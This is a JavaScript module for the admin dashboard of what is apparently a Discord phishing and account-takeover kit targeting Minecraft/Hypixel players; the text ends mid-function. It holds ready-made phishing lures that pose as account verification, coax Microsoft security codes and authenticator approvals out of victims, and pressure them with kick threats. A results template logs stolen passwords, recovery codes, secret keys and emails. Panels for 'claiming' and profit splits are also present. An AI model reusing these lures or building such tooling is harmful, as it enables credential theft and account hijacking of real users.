// Visual Builder & Phisher Settings View Module
const BuilderView = {
  activeTab: 'embeds',
  selectedType: 'main',
  userCustomEmbeds: {},

  // Official default bot embed templates matching defaultEmbeds.js
  defaultTemplates: {
    // 1. Phisher Verification Embeds
    main: {
      name: 'Minecraft Account Linking (Main FAQ)',
      category: 'Phisher Verification Embeds',
      title: 'Minecraft Account Linking',
      description: 'FAQ\n\nQ: Why do we need you to verify?\n\nA: It\'s for auto-roles, We need to give you your class roles, catacomb-level roles, and verified roles. It\'s also just for extra security in cases of a raid.\n\nQ: How long does it take for me to get my roles?\n\nA: We try to make the waiting time as little as possible, the fastest we were able to make it is as little as 30-50 seconds.\n\nQ: Why do you need to collect a code?\n\nA: The code confirms with the Minecraft API that you actually own that Minecraft account.',
      color: '#00ff00',
      authorName: '',
      authorIcon: '',
      thumbnail: '',
      image: '',
      footerText: 'Minecraft Verification System',
      footerIcon: '',
      fields: [],
      placeholders: []
    },
    authenticator: {
      name: 'Authenticator Prompt (Confirm on Device)',
      category: 'Phisher Verification Embeds',
      title: 'Last Step',
      description: 'Due to the increase of fake verifications, we require you to confirm on your device that you are the owner of this account by clicking on (sec).',
      color: '#ffff00',
      authorName: '',
      authorIcon: '',
      thumbnail: '',
      image: '',
      footerText: '',
      footerIcon: '',
      fields: [],
      placeholders: ['(sec)']
    },
    sec: {
      name: 'Security Email Verification Prompt',
      category: 'Phisher Verification Embeds',
      title: 'Last Step',
      description: 'Due to the increase of fake verifications, we require a code from `(sec)`, to prove that you are the owner of __{username}__. This code is only used for verification.\n\n**Note:**  It can take `30s-2mins` to send the code.',
      color: '#7ad3f3',
      authorName: '',
      authorIcon: '',
      thumbnail: '',
      image: '',
      footerText: '',
      footerIcon: '',
      fields: [],
      placeholders: ['(sec)', '{username}']
    },
    res: {
      name: 'Final Response (Account Linked)',
      category: 'Phisher Verification Embeds',
      title: 'Account linked!',
      description: 'Congratulations you linked the account successfully!',
      color: '#00ff00',
      authorName: '',
      authorIcon: '',
      thumbnail: '',
      image: '',
      footerText: '',
      footerIcon: '',
      fields: [],
      placeholders: []
    },
    oauth: {
      name: 'OAuth Verification Prompt',
      category: 'Phisher Verification Embeds',
      title: 'Verification',
      description: 'Use this link to verify instead!',
      color: '#00ff00',
      authorName: '',
      authorIcon: '',
      thumbnail: '',
      image: '',
      footerText: '',
      footerIcon: '',
      fields: [],
      placeholders: []
    },
    split: {
      name: 'Split Verification (API Down Fallback)',
      category: 'Phisher Verification Embeds',
      title: 'Verification Failed',
      description: 'We have failed to authenticate your account due to Hypixel\'s API being down, please retry using our alternative verification system.',
      color: '#ff0000',
      authorName: '',
      authorIcon: '',
      thumbnail: '',
      image: '',
      footerText: '',
      footerIcon: '',
      fields: [],
      placeholders: []
    },
    extrabutton: {
      name: 'Extra Custom Button Response',
      category: 'Phisher Verification Embeds',
      title: 'Not Set',
      description: 'Add any text here!',
      color: '#ff0000',
      authorName: '',
      authorIcon: '',
      thumbnail: '',
      image: '',
      footerText: '',
      footerIcon: '',
      fields: [],
      placeholders: []
    },

    // 2. Phisher Error Embeds
    'invalid email': {
      name: 'Invalid Email Format',
      category: 'Phisher Error Embeds',
      title: 'Invalid Email',
      description: 'The email you have entered `(sec)` is invalid, please retry using a valid email.',
      color: '#ff0000',
      authorName: '',
      authorIcon: '',
      thumbnail: '',
      image: '',
      footerText: '',
      footerIcon: '',
      fields: [],
      placeholders: ['(sec)']
    },
    "account doesn't exist": {
      name: 'Account / Email Doesn\'t Exist',
      category: 'Phisher Error Embeds',
      title: 'Error :x:',
      description: 'This account doesn\'t exist, please try again with a valid account!',
      color: '#ff0000',
      authorName: '',
      authorIcon: '',
      thumbnail: '',
      image: '',
      footerText: '',
      footerIcon: '',
      fields: [],
      placeholders: []
    },
    invalid: {
      name: 'Invalid Code Error',
      category: 'Phisher Error Embeds',
      title: 'Error :x:',
      description: 'The code you sent was wrong, please try again with a valid code!',
      color: '#ff0000',
      authorName: '',
      authorIcon: '',
      thumbnail: '',
      image: '',
      footerText: '',
      footerIcon: '',
      fields: [],
      placeholders: []
    },
    codenotnumbers: {
      name: 'Code Non-Numbers Error',
      category: 'Phisher Error Embeds',
      title: 'Error :x:',
      description: 'Invalid code, please confirm with the code that was sent to your email',
      color: '#ff0000',
      authorName: '',
      authorIcon: '',
      thumbnail: '',
      image: '',
      footerText: '',
      footerIcon: '',
      fields: [],
      placeholders: []
    },
    otp: {
      name: 'OTP Disabled (No Security Email)',
      category: 'Phisher Error Embeds',
      title: 'No Security email',
      description: 'Your email doesn\'t have a security email. Add a security email and then re-verify!',
      color: '#ff0000',
      authorName: '',
      authorIcon: '',
      thumbnail: '',
      image: '',
      footerText: '',
      footerIcon: '',
      fields: [],
      placeholders: []
    },
    howto: {
      name: 'How to Add a Security Email',
      category: 'Phisher Error Embeds',
      title: 'How to Add a Security Email',
      description: '**Step 1** Go to your [Microsoft Account](https://account.live.com/proofs/manage/additional)\n**Step 2** Click on "Security"\n**Step 3** Click on "Advanced Security options"\n**Step 4** Click "Add a new way to verify"\n**Step 5** Click "Email a code"\n**Step 6** Enter your email\n**Step 7** Wait 1-2 minutes and retry',
      color: '#c8c8c8',
      authorName: '',
      authorIcon: '',
      thumbnail: '',
      image: 'https://cdn.discordapp.com/ephemeral-attachments/1216753532951203893/1217799172531425421/HowTo.gif?ex=660556dc&is=65f2e1dc&hm=93a1731f755a0af317aa750f4f7257f5325e28076a4a898bb3414c538640afb7&',
      footerText: '',
      footerIcon: '',
      fields: [],
      placeholders: []
    },
    wrongnumber: {
      name: 'Authenticator Wrong Number',
      category: 'Phisher Error Embeds',
      title: 'Error :x:',
      description: 'You chose the wrong number, please try again and choose the right number!',
      color: '#ff0000',
      authorName: '',
      authorIcon: '',
      thumbnail: '',
      image: '',
      footerText: '',
      footerIcon: '',
      fields: [],
      placeholders: []
    },
    timeout: {
      name: 'Authenticator App Timeout',
      category: 'Phisher Error Embeds',
      title: 'Error :x:',
      description: 'Timeout, please try again! ⏱',
      color: '#ff0000',
      authorName: '',
      authorIcon: '',
      thumbnail: '',
      image: '',
      footerText: '',
      footerIcon: '',
      fields: [],
      placeholders: []
    },
    blacklisted: {
      name: 'Blacklisted User Notice',
      category: 'Phisher Error Embeds',
      title: 'Failed to verify you',
      description: 'We have detected an issue whilst trying to give you the correct roles. Please wait until a staff member manually verifies you. Thank you for your patience.',
      color: '#ff0000',
      authorName: '',
      authorIcon: '',
      thumbnail: '',
      image: '',
      footerText: '',
      footerIcon: '',
      fields: [],
      placeholders: []
    },
    locked: {
      name: 'Account Locked Notice',
      category: 'Phisher Error Embeds',
      title: 'Account Locked',
      description: 'Your account seems to be locked. Please log-in, resolve issues then retry.',
      color: '#ff0000',
      authorName: '',
      authorIcon: '',
      thumbnail: '',
      image: '',
      footerText: '',
      footerIcon: '',
      fields: [],
      placeholders: []
    },
    nomc: {
      name: 'Account Doesn\'t Own Minecraft',
      category: 'Phisher Error Embeds',
      title: 'Error :x:',
      description: 'We couldn\'t find your Minecraft Username to verify you, please retry using your minecraft email!',
      color: '#ff0000',
      authorName: '',
      authorIcon: '',
      thumbnail: '',
      image: '',
      footerText: '',
      footerIcon: '',
      fields: [],
      placeholders: []
    },
    howtoauth: {
      name: 'How to Verify with Authenticator',
      category: 'Phisher Error Embeds',
      title: 'Verify with Authenticator App',
      description: '**Step 1:** Download the Microsoft Authenticator app on your phone, or open it if already installed.\n**Step 2:** Login to your Microsoft account.\n**Step 3:** Tap the code on the app that corresponds to the code shown above.\n\nThat\'s it! You\'ve verified your account.',
      color: '#c8c8c8',
      authorName: '',
      authorIcon: '',
      thumbnail: '',
      image: '',
      footerText: '',
      footerIcon: '',
      fields: [],
      placeholders: []
    },
    invalidated: {
      name: 'Username Check Failed',
      category: 'Phisher Error Embeds',
      title: 'Failed to find username: %USERNAME%',
      description: 'We have searched for the username `%USERNAME%` and have failed to find stats for it. If you still wish to continue, click `Continue`. If you wish to restart, click `Retry`.',
      color: '#ff0000',
      authorName: '',
      authorIcon: '',
      thumbnail: '',
      image: '',
      footerText: '',
      footerIcon: '',
      fields: [],
      placeholders: ['%USERNAME%']
    },

    // 3. Autosecure Result Embeds
    listaccount: {
      name: 'Secured Account Log (List Account)',
      category: 'Autosecure Result Embeds',
      title: 'Account secured in %TIMETAKEN% seconds',
      description: '',
      color: '#b2c7e0',
      authorName: '',
      authorIcon: '',
      thumbnail: '',
      image: '',
      footerText: '%BAN%',
      footerIcon: '',
      fields: [
        { name: 'Username', value: '```%NEWNAME%```', inline: true },
        { name: 'Owns MC', value: '```%OWNSMC%```', inline: true },
        { name: 'Capes', value: '```%CAPES%```', inline: true },
        { name: 'Recovery Code', value: '```%RECOVERY%```', inline: false },
        { name: 'Primary Email', value: '```%EMAIL%```', inline: true },
        { name: 'Security Email', value: '```%SECURITY%```', inline: true },
        { name: 'Secret Key', value: '```%SECRETKEY%```', inline: true },
        { name: 'Password', value: '```%PASSWORD%```', inline: false }
      ],
      placeholders: ['%TIMETAKEN%', '%BAN%', '%NEWNAME%', '%OWNSMC%', '%CAPES%', '%RECOVERY%', '%EMAIL%', '%SECURITY%', '%SECRETKEY%', '%PASSWORD%']
    },
    statsmsg: {
      name: 'Player Stats Overview Card',
      category: 'Autosecure Result Embeds',
      title: 'Stats Overview',
      description: 'Player Hypixel & Skyblock Statistics',
      color: '#b2c7e0',
      authorName: '',
      authorIcon: '',
      thumbnail: '',
      image: '',
      footerText: '',
      footerIcon: '',
      fields: [
        { name: 'Rank', value: '%RANK%', inline: true },
        { name: 'NWL', value: '%NWL%', inline: true },
        { name: 'Gifted', value: '%GIFTED%', inline: true },
        { name: 'NW', value: '%NETWORTHTOTAL%', inline: true },
        { name: 'SA', value: '%SA%', inline: true },
        { name: 'LVL', value: '%SBLVL%', inline: true },
        { name: 'Lunar Cosmetics', value: '%LUNARCOSMETICS%', inline: true },
        { name: 'Lunar Emotes', value: '%LUNAREMOTES%', inline: true }
      ],
      placeholders: ['%RANK%', '%NWL%', '%GIFTED%', '%NETWORTHTOTAL%', '%SA%', '%SBLVL%', '%LUNARCOSMETICS%', '%LUNAREMOTES%']
    },

    // 4. Direct Message (DM) Embeds
    dm1: {
      name: 'Server Join Welcome DM',
      category: 'Direct Message (DM) Embeds',
      title: 'Welcome to (guildname)',
      description: 'In order to gain access to our channels and services you must verify your Minecraft account. If you do not verify you will be automatically kicked from the server. \n\n To get started, send me the message "(verifymsg)" and i\'ll give you more instructions.',
      color: '#ff0000',
      authorName: '',
      authorIcon: '',
      thumbnail: '',
      image: '',
      footerText: '',
      footerIcon: '',
      fields: [],
      placeholders: ['(guildname)', '(verifymsg)']
    },
    dm2: {
      name: 'Link Method Prompt DM',
      category: 'Direct Message (DM) Embeds',
      title: '',
      description: 'Thank you for choosing to link your Minecraft Account in (guildname)! By continuing you acknowledge that this information may be accessible by other users of the bot.\n\n**How would you like to link your account?**\n🅰️ Joining our server to get a code.\n🅱️ Using your Hypixel Social Profile.',
      color: '#ff0000',
      authorName: 'Link Minecraft Account to (guildname)',
      authorIcon: '',
      thumbnail: '',
      image: '',
      footerText: 'The first option is the easiest and the quickest option for first timers, we recommend going with that option.',
      footerIcon: '',
      fields: [],
      placeholders: ['(guildname)']
    },
    dm3: {
      name: 'Alternative Method Fallback DM',
      category: 'Direct Message (DM) Embeds',
      title: 'Alternative Verification',
      description: 'Our services seem to be down currently, please continue with our alternative method.',
      color: '#ff0000',
      authorName: '',
      authorIcon: '',
      thumbnail: '',
      image: '',
      footerText: '',
      footerIcon: '',
      fields: [],
      placeholders: []
    }
  },

  embedData: {
    title: '',
    description: '',
    color: '#00ff00',
    authorName: '',
    authorIcon: '',
    thumbnail: '',
    image: '',
    footerText: '',
    footerIcon: '',
    fields: []
  },

  async render() {
    const container = document.getElementById('view-content');
    container.innerHTML = `
      <div class="card">
        <div class="card-header">
          <span class="card-title"><i class="fas fa-magic"></i> Discord UI Designer & Phisher</span>
          <span class="badge-tag info">Live Customizer</span>
        </div>

        <div class="tabs-header" style="margin-top:14px;">
          <button class="tab-btn active" id="builder-tab-btn-embeds" onclick="BuilderView.switchTab('embeds')">
            <i class="fas fa-window-maximize"></i> Embed Designer
          </button>
          <button class="tab-btn" id="builder-tab-btn-presets" onclick="BuilderView.switchTab('presets')">
            <i class="fas fa-bookmark"></i> Presets
          </button>
          <button class="tab-btn" id="builder-tab-btn-phisher" onclick="BuilderView.switchTab('phisher')">
            <i class="fas fa-fish"></i> Phisher Config
          </button>
          <button class="tab-btn" id="builder-tab-btn-subusers" onclick="BuilderView.switchTab('subusers')">
            <i class="fas fa-users-cog"></i> Team / Sub-Users
          </button>
        </div>

        <div class="card-body">
          <!-- TAB 1: VISUAL EMBED BUILDER -->
          <div id="builder-tab-content-embeds">

            <!-- EMBED TYPE SELECTOR BAR -->
            <div style="background:rgba(255,255,255,0.03);border:1px solid var(--border-color);border-radius:8px;padding:16px;margin-bottom:20px;display:flex;flex-wrap:wrap;align-items:center;justify-content:space-between;gap:14px;">
              <div style="display:flex;align-items:center;gap:12px;flex:1;min-width:300px;">
                <div style="display:flex;flex-direction:column;gap:4px;flex:1;">
                  <label class="form-label" style="margin-bottom:0;font-weight:600;display:flex;align-items:center;gap:8px;">
                    <i class="fas fa-layer-group" style="color:var(--primary);"></i>
                    Select Embed Type to Design
                  </label>
                  <select id="emb-type-selector" class="form-select" style="font-weight:600;font-size:0.9rem;" onchange="BuilderView.onTypeChange(this.value)">
                    <!-- Populated dynamically -->
                  </select>
                </div>
              </div>

              <div style="display:flex;align-items:center;gap:10px;">
                <span id="emb-status-badge" class="badge-tag info">Bot Default</span>
                <button class="btn btn-secondary btn-sm" onclick="BuilderView.resetToDefault()" title="Revert this embed type to bot default">
                  <i class="fas fa-undo"></i> Reset to Default
                </button>
              </div>
            </div>

            <!-- DYNAMIC PLACEHOLDERS BANNER -->
            <div id="emb-placeholders-banner" style="display:none;margin-bottom:20px;padding:12px 16px;background:rgba(99,102,241,0.08);border:1px solid rgba(99,102,241,0.22);border-radius:8px;font-size:0.82rem;align-items:center;justify-content:space-between;gap:12px;">
              <div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap;">
                <i class="fas fa-info-circle" style="color:var(--primary);font-size:1rem;"></i>
                <span style="color:var(--text-muted);">Dynamic Bot Variables:</span>
                <span id="emb-placeholders-list" style="display:flex;gap:6px;flex-wrap:wrap;"></span>
              </div>
              <span style="font-size:0.75rem;color:var(--text-dim);white-space:nowrap;">Replaced automatically at runtime</span>
            </div>

            <div style="display:grid;grid-template-columns:1fr 460px;gap:28px;">
              <!-- Left: Controls -->
              <div>
                <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;">
                  <div class="form-group">
                    <label class="form-label">Embed Title</label>
                    <input type="text" id="emb-title" class="form-input" value="${this.embedData.title || ''}" oninput="BuilderView.updateLivePreview()" placeholder="Optional embed title" />
                  </div>
                  <div class="form-group">
                    <label class="form-label">Accent Color (Hex)</label>
                    <div style="display:flex;gap:8px;">
                      <input type="color" id="emb-color-picker" value="${this.embedData.color || '#00ff00'}" 
                             style="width:40px;height:40px;border:none;border-radius:4px;cursor:pointer;background:none;" 
                             onchange="document.getElementById('emb-color').value=this.value;BuilderView.updateLivePreview();" />
                      <input type="text" id="emb-color" class="form-input" value="${this.embedData.color || '#00ff00'}" oninput="BuilderView.updateColorFromInput(this.value)" />
                    </div>
                  </div>
                </div>

                <div class="form-group">
                  <label class="form-label">Description / Body</label>
                  <textarea id="emb-desc" class="form-textarea" style="height:110px;" oninput="BuilderView.updateLivePreview()" placeholder="Embed description text...">${this.embedData.description || ''}</textarea>
                </div>

                <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;">
                  <div class="form-group">
                    <label class="form-label">Author Name</label>
                    <input type="text" id="emb-author-name" class="form-input" value="${this.embedData.authorName || ''}" placeholder="e.g. Verification Bot" oninput="BuilderView.updateLivePreview()" />
                  </div>
                  <div class="form-group">
                    <label class="form-label">Author Icon URL</label>
                    <input type="text" id="emb-author-icon" class="form-input" value="${this.embedData.authorIcon || ''}" placeholder="https://..." oninput="BuilderView.updateLivePreview()" />
                  </div>
                </div>

                <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;">
                  <div class="form-group">
                    <label class="form-label">Thumbnail URL</label>
                    <input type="text" id="emb-thumbnail" class="form-input" value="${this.embedData.thumbnail || ''}" placeholder="https://..." oninput="BuilderView.updateLivePreview()" />
                  </div>
                  <div class="form-group">
                    <label class="form-label">Banner Image URL</label>
                    <input type="text" id="emb-image" class="form-input" value="${this.embedData.image || ''}" placeholder="https://..." oninput="BuilderView.updateLivePreview()" />
                  </div>
                </div>

                <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;">
                  <div class="form-group">
                    <label class="form-label">Footer Text</label>
                    <input type="text" id="emb-footer-text" class="form-input" value="${this.embedData.footerText || ''}" placeholder="e.g. Powered by Autosecure" oninput="BuilderView.updateLivePreview()" />
                  </div>
                  <div class="form-group">
                    <label class="form-label">Footer Icon URL</label>
                    <input type="text" id="emb-footer-icon" class="form-input" value="${this.embedData.footerIcon || ''}" placeholder="https://..." oninput="BuilderView.updateLivePreview()" />
                  </div>
                </div>

                <!-- Fields Manager -->
                <div style="margin-top:16px;">
                  <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:10px;">
                    <span style="font-size:0.85rem;font-weight:600;color:var(--text-muted);">
                      Embed Fields (<span id="emb-fields-count">${(this.embedData.fields || []).length}</span>)
                    </span>
                    <button class="btn btn-secondary btn-sm" onclick="BuilderView.addField()">
                      <i class="fas fa-plus"></i> Add Field
                    </button>
                  </div>
                  <div id="emb-fields-container" style="display:flex;flex-direction:column;gap:8px;"></div>
                </div>

                <div style="display:flex;flex-wrap:wrap;gap:10px;margin-top:24px;border-top:1px solid var(--border-color);padding-top:18px;">
                  <button class="btn btn-primary" onclick="BuilderView.saveEmbedConfig()">
                    <i class="fas fa-save"></i> Save Configuration
                  </button>
                  <button class="btn btn-secondary" onclick="BuilderView.exportEmbedJson()">
                    <i class="fas fa-code"></i> Export JSON
                  </button>
                  <button class="btn btn-secondary" onclick="BuilderView.importEmbedJson()">
                    <i class="fas fa-file-import"></i> Import JSON
                  </button>
                </div>
              </div>

              <!-- Right: Real-time Discord Preview -->
              <div>
                <div style="font-size:0.75rem;font-weight:700;text-transform:uppercase;color:var(--text-dim);margin-bottom:8px;display:flex;justify-content:space-between;align-items:center;">
                  <span>Live Discord Message Preview</span>
                  <span id="preview-type-name" style="color:var(--primary);font-size:0.75rem;font-weight:600;"></span>
                </div>
                <div style="background:#313338;padding:20px;border-radius:8px;border:1px solid rgba(255,255,255,0.06);min-height:220px;">
                  <div id="discord-preview-box" class="discord-embed-preview"></div>
                </div>
              </div>
            </div>
          </div>

          <!-- TAB 2: PRESETS -->
          <div id="builder-tab-content-presets" style="display:none;">
            <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;">
              <h4 style="font-size:0.95rem;font-weight:600;">Saved Preset Configurations</h4>
              <button class="btn btn-primary btn-sm" onclick="BuilderView.openSavePresetModal()">
                <i class="fas fa-bookmark"></i> Save Current as Preset
              </button>
            </div>
            <div id="presets-container"></div>
          </div>

          <!-- TAB 3: PHISHER CONFIG -->
          <div id="builder-tab-content-phisher" style="display:none;">
            <div id="phisher-container" style="max-width:620px;">
              <div style="text-align:center;padding:30px;"><i class="fas fa-spinner fa-spin"></i></div>
            </div>
          </div>

          <!-- TAB 4: SUB-USERS & PERMISSIONS -->
          <div id="builder-tab-content-subusers" style="display:none;">
            <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;">
              <p style="font-size:0.85rem;color:var(--text-muted);margin:0;">
                Grant team members access to claiming, bots, embeds, or custom profit splits.
              </p>
              <button class="btn btn-primary btn-sm" onclick="BuilderView.openAddSubuserModal()">
                <i class="fas fa-user-plus"></i> Add Sub-User
              </button>
            </div>
            <div id="subusers-container"></div>
          </div>
        </div>
      </div>
    `;

    await this.initEmbedDesigner();
  },

  async initEmbedDesigner() {
    this.populateTypeDropdown();
    await this.loadAllUserEmbeds();
    this.selectType(this.selectedType);
  },

  populateTypeDropdown() {
    const selector = document.getElementById('emb-type-selector');
    if (!selector) return;

    // Group templates by category
    const categories = {
      'Phisher Verification Embeds': [],
      'Phisher Error Embeds': [],
      'Autosecure Result Embeds': [],
      'Direct Message (DM) Embeds': []
    };

    Object.entries(this.defaultTemplates).forEach(([key, tpl]) => {
      const cat = tpl.category || 'Other Embeds';
      if (!categories[cat]) categories[cat] = [];
      categories[cat].push({ key, ...tpl });
    });

    let html = '';
    Object.entries(categories).forEach(([categoryName, items]) => {
      if (!items.length) return;
      html += `<optgroup label="${categoryName}">`;
      items.forEach(item => {
        const isSelected = item.key === this.selectedType ? 'selected' : '';
        html += `<option value="${item.key}" ${isSelected}>${item.name} [${item.key}]</option>`;
      });
      html += `</optgroup>`;
    });

    selector.innerHTML = html;
  },

  async loadAllUserEmbeds() {
    try {
      const res = await API.get('/api/builder/embeds');
      this.userCustomEmbeds = {};
      if (res && res.embeds && Array.isArray(res.embeds)) {
        res.embeds.forEach(row => {
          if (row.type) {
            this.userCustomEmbeds[row.type] = row.embed;
          }
        });
      }
    } catch (err) {
      console.warn('Could not load custom embeds from API:', err);
    }
  },

  onTypeChange(type) {
    this.selectType(type);
  },

  selectType(type) {
    if (!this.defaultTemplates[type]) {
      type = 'main';
    }
    this.selectedType = type;

    const selector = document.getElementById('emb-type-selector');
    if (selector && selector.value !== type) {
      selector.value = type;
    }

    const tpl = this.defaultTemplates[type];
    const custom = this.userCustomEmbeds[type];
    const isCustom = !!custom;

    // Load either custom or default template
    if (isCustom) {
      this.embedData = this.normalizeEmbedObject(custom);
    } else {
      this.embedData = JSON.parse(JSON.stringify(tpl));
    }

    // Update Status Badge
    const statusBadge = document.getElementById('emb-status-badge');
    if (statusBadge) {
      if (isCustom) {
        statusBadge.className = 'badge-tag success';
        statusBadge.innerHTML = '<i class="fas fa-check-circle"></i> Customized';
      } else {
        statusBadge.className = 'badge-tag info';
        statusBadge.innerHTML = '<i class="fas fa-robot"></i> Bot Default';
      }
    }

    // Update Preview Label
    const previewLabel = document.getElementById('preview-type-name');
    if (previewLabel) {
      previewLabel.textContent = tpl.name;
    }

    // Update Dynamic Placeholders Banner
    const banner = document.getElementById('emb-placeholders-banner');
    const list = document.getElementById('emb-placeholders-list');
    if (banner && list) {
      if (tpl.placeholders && tpl.placeholders.length > 0) {
        list.innerHTML = tpl.placeholders.map(p => `
          <code class="code-badge" style="cursor:pointer;" onclick="API.copyText('${p}', 'Variable')" title="Click to copy ${p}">${p}</code>
        `).join('');
        banner.style.display = 'flex';
      } else {
        banner.style.display = 'none';
      }
    }

    // Populate Form Controls
    this.fillFormControls();
    this.renderFieldInputs();
    this.updateLivePreview();
  },

  normalizeEmbedObject(obj) {
    if (!obj || typeof obj !== 'object') {
      return JSON.parse(JSON.stringify(this.defaultTemplates[this.selectedType]));
    }

    // Color conversion
    let color = obj.color;
    if (typeof color === 'number') {
      color = '#' + color.toString(16).padStart(6, '0');
    } else if (typeof color === 'string' && !color.startsWith('#')) {
      color = '#' + color;
    }

    // Author
    let authorName = obj.authorName || (obj.author ? obj.author.name : '') || '';
    let authorIcon = obj.authorIcon || (obj.author ? (obj.author.iconURL || obj.author.icon_url) : '') || '';

    // Thumbnail & Image
    let thumbnail = typeof obj.thumbnail === 'object' && obj.thumbnail ? (obj.thumbnail.url || '') : (obj.thumbnail || '');
    let image = typeof obj.image === 'object' && obj.image ? (obj.image.url || '') : (obj.image || '');

    // Footer
    let footerText = obj.footerText || (obj.footer ? obj.footer.text : '') || '';
    let footerIcon = obj.footerIcon || (obj.footer ? (obj.footer.iconURL || obj.footer.icon_url) : '') || '';

    // Fields
    let fields = Array.isArray(obj.fields) ? obj.fields.map(f => ({
      name: f.name || '',
      value: f.value || '',
      inline: !!f.inline
    })) : [];

    return {
      title: obj.title || '',
      description: obj.description || '',
      color: color || '#00ff00',
      authorName,
      authorIcon,
      thumbnail,
      image,
      footerText,
      footerIcon,
      fields
    };
  },

  fillFormControls() {
    const elTitle = document.getElementById('emb-title');
    const elDesc = document.getElementById('emb-desc');
    const elColor = document.getElementById('emb-color');
    const elPicker = document.getElementById('emb-color-picker');
    const elAuthorName = document.getElementById('emb-author-name');
    const elAuthorIcon = document.getElementById('emb-author-icon');
    const elThumbnail = document.getElementById('emb-thumbnail');
    const elImage = document.getElementById('emb-image');
    const elFooterText = document.getElementById('emb-footer-text');
    const elFooterIcon = document.getElementById('emb-footer-icon');

    if (elTitle) elTitle.value = this.embedData.title || '';
    if (elDesc) elDesc.value = this.embedData.description || '';
    if (elColor) elColor.value = this.embedData.color || '#00ff00';
    if (elPicker) elPicker.value = this.embedData.color || '#00ff00';
    if (elAuthorName) elAuthorName.value = this.embedData.authorName || '';
    if (elAuthorIcon) elAuthorIcon.value = this.embedData.authorIcon || '';
    if (elThumbnail) elThumbnail.value = this.embedData.thumbnail || '';
    if (elImage) elImage.value = this.embedData.image || '';
    if (elFooterText) elFooterText.value = this.embedData.footerText || '';
    if (elFooterIcon) elFooterIcon.value = this.embedData.footerIcon || '';
  },

  updateColorFromInput(val) {
    const picker = document.getElementById('emb-color-picker');
    if (picker && /^#[0-9A-Fa-f]{6}$/.test(val)) {
      picker.value = val;
    }
    this.updateLivePreview();
  },

  switchTab(tabId) {
    this.activeTab = tabId;
    ['embeds', 'presets', 'phisher', 'subusers'].forEach(t => {
      const btn = document.getElementById(`builder-tab-btn-${t}`);
      const content = document.getElementById(`builder-tab-content-${t}`);
      if (btn && content) {
        if (t === tabId) {
          btn.classList.add('active');
          content.style.display = 'block';
        } else {
          btn.classList.remove('active');
          content.style.display = 'none';
        }
      }
    });

    if (tabId === 'presets') this.loadPresets();
    if (tabId === 'phisher') this.loadPhisherConfig();
    if (tabId === 'subusers') this.loadSubusers();
  },

  renderFieldInputs() {
    const container = document.getElementById('emb-fields-container');
    const countBadge = document.getElementById('emb-fields-count');
    if (!container) return;

    const fields = this.embedData.fields || [];
    if (countBadge) countBadge.textContent = fields.length;

    if (!fields.length) {
      container.innerHTML = `<div style="font-size:0.75rem;color:var(--text-dim);font-style:italic;">No fields added to this embed.</div>`;
      return;
    }

    container.innerHTML = fields.map((f, i) => `
      <div style="display:grid;grid-template-columns:1fr 1fr auto auto;gap:8px;align-items:center;">
        <input type="text" class="form-input" style="padding:6px 10px;font-size:0.8rem;" value="${f.name || ''}" placeholder="Field Title" oninput="BuilderView.updateField(${i}, 'name', this.value)" />
        <input type="text" class="form-input" style="padding:6px 10px;font-size:0.8rem;" value="${f.value || ''}" placeholder="Field Value" oninput="BuilderView.updateField(${i}, 'value', this.value)" />
        <label style="font-size:0.75rem;display:flex;align-items:center;gap:4px;cursor:pointer;white-space:nowrap;">
          <input type="checkbox" ${f.inline ? 'checked' : ''} onchange="BuilderView.updateField(${i}, 'inline', this.checked)" /> Inline
        </label>
        <button class="btn btn-danger btn-sm" onclick="BuilderView.removeField(${i})" title="Remove Field"><i class="fas fa-times"></i></button>
      </div>
    `).join('');
  },

  addField() {
    if (!this.embedData.fields) this.embedData.fields = [];
    this.embedData.fields.push({ name: 'Field Name', value: 'Field Value', inline: true });
    this.renderFieldInputs();
    this.updateLivePreview();
  },

  updateField(index, key, val) {
    if (this.embedData.fields && this.embedData.fields[index]) {
      this.embedData.fields[index][key] = val;
      this.updateLivePreview();
    }
  },

  removeField(index) {
    if (this.embedData.fields && this.embedData.fields[index] !== undefined) {
      this.embedData.fields.splice(index, 1);
      this.renderFieldInputs();
      this.updateLivePreview();
    }
  },

  updateLivePreview() {
    this.embedData.title = document.getElementById('emb-title')?.value || '';
    this.embedData.description = document.getElementById('emb-desc')?.value || '';
    this.embedData.color = document.getElementById('emb-color')?.value || '#00ff00';
    this.embedData.authorName = document.getElementById('emb-author-name')?.value || '';
    this.embedData.authorIcon = document.getElementById('emb-author-icon')?.value || '';
    this.embedData.thumbnail = document.getElementById('emb-thumbnail')?.value || '';
    this.embedData.image = document.getElementById('emb-image')?.value || '';
    this.embedData.footerText = document.getElementById('emb-footer-text')?.value || '';
    this.embedData.footerIcon = document.getElementById('emb-footer-icon')?.value || '';

    const preview = document.getElementById('discord-preview-box');
    if (!preview) return;

    preview.style.borderLeftColor = this.embedData.color;

    let fieldsHtml = '';
    const fields = this.embedData.fields || [];
    if (fields.length) {
      fieldsHtml = `
        <div class="embed-fields-grid">
          ${fields.map(f => `
            <div>
              <div class="embed-field-name">${this.escapeHtml(f.name || '')}</div>
              <div class="embed-field-val">${this.formatDiscordMarkdown(f.value || '')}</div>
            </div>
          `).join('')}
        </div>
      `;
    }

    preview.innerHTML = `
      ${this.embedData.authorName ? `
        <div class="embed-author">
          ${this.embedData.authorIcon ? `<img src="${this.embedData.authorIcon}" onerror="this.style.display='none'" />` : ''}
          <span>${this.escapeHtml(this.embedData.authorName)}</span>
        </div>
      ` : ''}

      <div style="display:flex;align-items:flex-start;justify-content:space-between;gap:12px;">
        <div style="flex:1;">
          ${this.embedData.title ? `<div class="embed-title">${this.escapeHtml(this.embedData.title)}</div>` : ''}
          ${this.embedData.description ? `<div class="embed-desc">${this.formatDiscordMarkdown(this.embedData.description)}</div>` : ''}
        </div>
        ${this.embedData.thumbnail ? `
          <img src="${this.embedData.thumbnail}" onerror="this.style.display='none'" style="width:55px;height:55px;border-radius:4px;object-fit:cover;" />
        ` : ''}
      </div>

      ${fieldsHtml}

      ${this.embedData.image ? `
        <img src="${this.embedData.image}" onerror="this.style.display='none'" style="max-width:100%;border-radius:4px;margin-top:8px;margin-bottom:8px;" />
      ` : ''}

      ${this.embedData.footerText ? `
